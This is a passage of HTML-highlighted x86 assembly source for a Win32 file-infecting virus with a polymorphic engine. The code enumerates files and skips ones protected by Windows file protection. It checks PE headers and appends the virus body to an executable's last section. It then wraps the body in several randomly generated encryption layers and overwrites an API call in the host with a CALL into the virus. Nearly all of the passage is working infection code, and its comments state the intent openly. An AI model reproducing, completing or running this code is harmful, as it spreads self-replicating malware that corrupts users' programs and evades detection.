        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BufStrFilename</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_SfcIsFileProtected</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">DirectAgain</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Try to infect this file</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">NotProtected</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">infect_file</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;More files, please</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
                                
</span><span class="sc5">DirectAgain</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NumInfected</span><span class="sc4">],</span><span class="sc2">05h</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">no_more_pls</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DirectFindData</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">h_Find</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_FindNextFileA</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">work_with_WFD</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Close Win32 find handle</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">no_more_pls</span><span class="sc4">:</span><span class="sc0">    

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">h_Find</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_FindClose</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">exit_in_dir</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Infect file routines</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On entry:</span><span class="sc0">
</span><span class="sc1">;       BufStrFilename -&gt; Buffer filled with path + filename</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">SEH_Block_0001</span><span class="sc0">  </span><span class="sc9">macro</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,-</span><span class="sc5">cPushad</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Ape_err</span><span class="sc0">
                </span><span class="sc9">endm</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Open target file... Do not change its size yet, we have</span><span class="sc0">
        </span><span class="sc1">;to check first if the file can be infected</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">infect_file</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OpenMapFile</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">inf_file_err</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------               </span><span class="sc0">
        </span><span class="sc1">;Register ebx contains the base address of the target file</span><span class="sc0">
        </span><span class="sc1">;all along infection routines</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc1">;Check for MZ signature at base address</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc5">IMAGE_DOS_SIGNATURE</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">inf_close_file</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc1">;Check file address of relocation table</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">MZ_lfarlc</span><span class="sc4">],</span><span class="sc2">0040h</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">inf_close_file</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc1">;Now go to the pe header and check for the PE signature</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">IMAGE_NT_SIGNATURE</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">inf_close_file</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc1">;Check machine field in IMAGE_FILE_HEADER</span><span class="sc0">
                </span><span class="sc1">;just allow i386 PE files</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">FH_Machine</span><span class="sc4">],</span><span class="sc5">IMAGE_FILE_MACHINE_I386</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">inf_close_file</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc1">;Now check the characteristics, look if file</span><span class="sc0">
                </span><span class="sc1">;is an executable</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">FH_Characteristics</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">IMAGE_FILE_EXECUTABLE_IMAGE</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">inf_close_file</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc1">;Avoid DLL's</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">IMAGE_FILE_DLL</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">inf_close_file</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Virus resides on last section</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_last_sh</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">inf_close_file</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">virus_sh</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Save a pointer to imports</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc0">                 \
                   </span><span class="sc5">OH_DataDirectory</span><span class="sc4">+</span><span class="sc0">            \
                                   </span><span class="sc5">DE_Import</span><span class="sc4">+</span><span class="sc0">               \
                                   </span><span class="sc5">DD_VirtualAddress</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileImport</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------                               </span><span class="sc0">
        </span><span class="sc1">;Go to relocations</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc0">                 \
                   </span><span class="sc5">OH_DataDirectory</span><span class="sc4">+</span><span class="sc0">            \
                                   </span><span class="sc5">DE_BaseReloc</span><span class="sc4">+</span><span class="sc0">            \
                                   </span><span class="sc5">DD_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">cant_overwrite</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Relocations sections is the last section?</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">got_vir_offset</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;We cant overwrite relocations...</span><span class="sc0">
        </span><span class="sc1">;...lets attach the virus to the end of last section</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">cant_overwrite</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_SizeOfRawData</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">got_vir_offset</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">got_vir_offset</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">vir_offset</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Search inside host code...</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc5">@SEH_SetupFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">SEH_Block_0001</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ApeIt</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">Pushad_ecx</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">Ape_err</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc5">@SEH_RemoveFrame</span><span class="sc0">

        </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">inf_close_file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">inject_offs</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Close file...</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">UnmapClose</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">HandleClose</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;...and remap with oversize</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">00000001h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OpenMapFile</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">inf_file_err</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">virus_sh</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Save original code</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">inject_offs</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">org_code</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">movsd</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Get CRC32 of main virus body and save it for l8r use</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">SizeOfProtect</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CRC_protected</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_crc32</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ViralChecksum</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Move virus to file</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">viro_sys</span><span class="sc4">]</span><span class="sc0">    
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">vir_offset</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">             
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">inf_size</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">               

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Initialize size of all decryptors</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">decryptor_size</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Save some registers on 1st decryptor</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">IsFirst</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">
                
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Generate polymorphic encryption</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">vir_offset</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_range</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">each_layer</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000001h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Set1stFlag</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">IsFirst</span><span class="sc4">],</span><span class="sc2">0FFh</span><span class="sc0">
</span><span class="sc5">Set1stFlag</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">decryptor_size</span><span class="sc4">]</span><span class="sc0">              
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">inf_size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">vir_offset</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Mutate</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">decryptor_size</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">              
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">each_layer</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Insert a call to virus code over the api call</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">inject_offs</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">               
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Calculate the CALL displacement</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_code_sh</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">OH_FileAlignment</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">raw_align</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">inject_offs</span><span class="sc4">]</span><span class="sc0">
